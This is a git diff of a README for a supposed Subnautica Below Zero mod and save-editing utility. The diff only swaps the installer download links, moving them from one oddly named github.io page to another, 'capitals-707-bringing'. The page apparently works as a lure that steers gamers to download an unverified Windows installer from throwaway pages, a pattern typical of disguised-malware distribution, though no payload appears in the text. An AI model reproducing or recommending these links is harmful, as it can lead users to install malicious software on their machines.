@@ -2,7 +2,7 @@
 
 The Subnautica Below Zero Mod Utility Suite 2026 is a comprehensive Windows application designed to enhance your gaming experience. It provides tools for save editing, item spawning, and various gameplay adjustments, allowing you to customize your underwater adventure seamlessly.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -60,6 +60,6 @@ The tool itself is lightweight and should not impact game performance. However, 
 
 For the latest version, updates, and additional resources, please download from the official page:
 
-[Get the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Get the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided as-is for educational and personal use. Always back up your game saves before making modifications. Last updated: October 2026.
